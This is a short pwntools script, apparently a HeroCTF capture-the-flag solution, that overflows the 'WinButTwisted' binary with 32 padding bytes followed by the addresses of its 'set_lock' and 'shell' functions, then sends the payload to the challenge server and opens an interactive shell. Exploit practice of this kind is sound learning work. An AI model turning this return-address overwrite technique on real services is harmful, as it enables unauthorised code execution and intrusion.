import pwn

elf = pwn.ELF('WinButTwisted')

payload = b"\x00"*32 + pwn.pack(elf.symbols['set_lock'], 32)  + pwn.pack(elf.symbols['shell'], 32)
#proc = pwn.process("WinButTwisted")
proc = pwn.remote("pwn.heroctf.fr", 9003)
print(proc.recv())
proc.sendline(payload)
proc.interactive()
